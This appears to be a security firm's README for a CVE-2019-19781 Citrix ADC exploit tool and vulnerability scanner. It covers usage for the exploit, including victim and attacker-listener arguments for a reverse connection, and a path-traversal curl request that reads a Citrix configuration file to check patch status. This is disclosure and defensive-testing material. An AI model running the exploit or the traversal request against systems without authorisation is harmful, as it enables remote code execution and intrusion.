# CVE-2019-19781

This was only uploaded due to other researchers publishing their code first. We would have hoped to have had this hidden for awhile longer while defenders had appropriate time to patch their systems.

We are all for responsible disclosure, in this case - the cat was already out of the bag.

Exploits: CVE-2019-19781

## Citrixmash (CVE-2019-19781 exploit)

root@stronghold-nix:/home/relik/Desktop/git/cve-2019-19781# python citrixmash.py 

Citrixmash v0.1 - Exploits the Citrix Directory Traversal Bug: CVE-2019-19781
Tool Written by: Rob Simon and Dave Kennedy
Contributions: The TrustedSec Team 
Website: https://www.trustedsec.com
INFO: https://www.trustedsec.com/blog/critical-exposure-in-citrix-adc-netscaler-unauthenticated-remote-code-execution/
Forensics and IOCS: https://www.trustedsec.com/blog/netscaler-remote-code-execution-forensics/

This tool exploits a directory traversal bug within Citrix ADC (NetScalers) which calls a perl script that is used
to append files in an XML format to the victim machine. This in turn allows for remote code execution.

Be sure to cleanup these two file locations:
    /var/tmp/netscaler/portal/templates/
    /netscaler/portal/templates/

Note that DNS hostnames and IP addresses are supported in victimaddress and attackerip_listener fields.

Usage:

python citrixmash.py <victimaddress> <victimport> <attackerip_listener> <attacker_port>

usage: citrixmash.py [-h] target targetport attackerip attackerport

## CVE-2019-19781 Scanner

This is a simple test to see if the server is still vulnerable to CVE-2019-19781.

Usage: python3 cve-2019-19781.py <serverip> <serverport>

Note you can use CIDR notations such as 192.168.1.1/24 and hostnames as well.

It will result if the server is still vulnerable or not. You can only do one server at a time.

CVE-2019-19781-Scanner
Company: TrustedSec
Written by: Dave Kennedy
This will look to see if the remote system is still vulnerable to CVE-2019-19781. This 
will only scan one host at a time.
You can use CIDR notations as well for example: 192.168.1.1/24
You can use hostnames instead of IP addresses also.
Example: python3 cve-2019-19781_scanner.py 192.168.1.1/24 443
Example2: python3 cve-2019-19781_scanner.py 192.168.1.1 443
Example3: python3 cve-2019-19781_scanner.py fakewebsiteaddress.com 443
Example4: python3 cve-2019-19781_scanner.py as15169 443
Example5: python3 cve-2019-19781_scanner.py 192.168.1.1/24 443 verbose
Usage: python3 cve-2019-19781_scanner.py targetip targetport

usage: cve-2019-19781_scanner.py [-h] target targetport [verbose]


## Manually Validate Patch

If you want to test to see if this exposure is mitigated use the following:

curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is

Either a 403 means that you are patched or if it returns a Citrix website and NOT the smb.conf file itself.

If you can see smb.conf, then you are vulnerable.

## Installation

To install the requirements, you will need to run the command below. 

pip3 install -r requirements.txt